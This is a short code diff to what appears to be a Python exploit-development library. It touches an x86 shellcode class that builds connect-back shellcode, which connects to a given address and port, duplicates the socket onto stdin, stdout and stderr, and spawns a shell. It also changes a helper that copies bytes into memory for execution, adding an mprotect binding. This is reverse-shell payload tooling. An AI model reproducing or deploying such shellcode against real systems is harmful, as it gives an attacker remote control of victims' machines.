@@ -336,7 +336,7 @@ class x86_shellcode:
             int 0x80 ;exec sys_connect
             xchg ebx,edx ;save sockfd
             """.format(addr=addr, port=port))
-        assert contains_not(sc, "\0")
+        assert contains_not(sc, "\0\n")
         return sc + x86_shellcode.dup2_ebx + x86_shellcode.shell
 
 
@@ -609,13 +609,15 @@ class Remote_x86_64(object):
 
 try:
     libc = ctypes.CDLL("libc.so.6")
+    mprotect = libc.mprotect
+    mprotect.argtypes = [c_long, c_long, c_int]
 except:
     pass
 
 def alloc_exec_buffer(buf):
     sz = len(buf)
     buf = ctypes.c_char_p(buf)
-    addr = ctypes.c_void_p(libc.valloc(sz))
+    addr = ctypes.c_void_p(libc.malloc(sz))
     if 0 == addr:
         raise Exception("valloc failed")
     libc.memmove(addr, buf, sz)
